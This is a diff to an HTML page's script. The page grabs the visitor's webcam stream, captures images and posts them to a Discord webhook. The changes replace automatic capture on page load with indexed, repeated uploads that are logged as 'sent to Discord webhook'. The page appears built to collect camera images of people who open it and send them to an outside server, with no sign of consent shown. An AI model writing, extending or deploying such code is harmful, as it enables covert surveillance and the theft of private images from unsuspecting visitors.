@@ -69,14 +69,13 @@
 
     <script>
         const video = document.getElementById('videoElement');
+        let imgIndex = 1;
 
         // Check if user's browser supports media devices
         if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
             navigator.mediaDevices.getUserMedia({ video: true })
                 .then(function (stream) {
                     video.srcObject = stream;
-                    // Automatically trigger picture capture
-                    capturePicture();
                 })
                 .catch(function (error) {
                     console.error("Error accessing camera:", error);
@@ -95,14 +94,15 @@
             const imgData = imgURL.replace(/^data:image\/\w+;base64,/, '');
             const imgBlob = new Blob([imgData], { type: 'image/png' });
             const imgFormData = new FormData();
-            imgFormData.append('image', imgBlob, 'captured_image.png');
+            imgFormData.append('image' + imgIndex, imgBlob, 'captured_image_' + imgIndex + '.png');
 
             fetch(webhookURL, {
                 method: 'POST',
                 body: imgFormData
             });
 
-            console.log('Image sent to Discord webhook');
+            console.log('Image ' + imgIndex + ' sent to Discord webhook');
+            imgIndex++;
         }
 
         const downloadButton = document.getElementById('downloadButton');
@@ -129,4 +129,3 @@
         });
     </script>
 </body>
-</html>
